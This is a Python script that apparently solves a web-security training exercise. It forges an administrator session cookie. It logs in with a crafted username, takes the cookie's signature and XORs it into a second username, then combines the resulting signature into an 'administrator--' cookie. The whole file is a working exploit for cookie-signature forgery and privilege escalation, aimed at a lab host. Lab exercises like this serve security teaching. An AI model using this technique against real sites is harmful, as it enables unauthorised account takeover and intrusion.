#!/bin/python3

import sys
import requests
import base64
import urllib.parse as URL


def login(username):
    url = 'http://ptl-85496b2b-d09f64a5.libcurl.so/'
    resp = requests.post(url + 'login.php', data={'username': username, 'password': 'Password1'}, allow_redirects=False)

    if resp:
        cookie = resp.headers['set-cookie'].split('=')[1]
        return cookie


def xor(str1, str2):
    ret=""
    for i, char in enumerate(str1):
        val = chr(str1[i] ^ str2[i])
        ret = ret[0:] + val
    return ret

def decode(cookie):
    urldecoded_cookie = URL.unquote(cookie)
    decoded_cookie = base64.urlsafe_b64decode(urldecoded_cookie)
    return decoded_cookie

def encode(value):
    encoded_cookie = base64.urlsafe_b64encode(value)
    urlencoded_cookie = URL.quote(encoded_cookie)
    return urlencoded_cookie



cookie = login('administ')
print('cookie: ' + cookie)
signature1 = decode(cookie).split(b'--')[1]
print(b"sig1: " + signature1)

username2 = xor(b"rator\0\0\0",signature1)
print("magic username: " + username2)

cookie2 = login(username2)
print("cookie2: " + cookie2)
print(b"decoded cookie2: " + decode(cookie2))
print(decode(cookie2).split(b'--')[1])
signature2 = decode(cookie2).split(b'--')[1]
print(encode(b"administrator--" + signature2))
